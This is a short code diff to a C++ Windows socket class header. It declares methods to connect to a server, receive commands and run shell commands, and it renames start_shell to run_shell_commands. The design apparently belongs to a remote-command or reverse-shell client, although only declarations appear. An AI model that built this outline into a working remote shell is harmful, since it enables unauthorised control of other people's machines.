@@ -30,13 +30,15 @@ public:
     void create_socket();
     bool connect_socket();
     bool check_connection();
+    void print_output(const char* output_str);
     int receive_commands();
-    int start_shell();
+    int run_shell_commands(const char* cmd);
+    void close_connection();
 
 private:
     WSADATA wsaData;
     struct sockaddr_in addr;
-    SOCKET socket;
+    SOCKET socket = INVALID_SOCKET;
     char rdata[BUFFER_SIZE];
     const char* server;
     unsigned short int port;
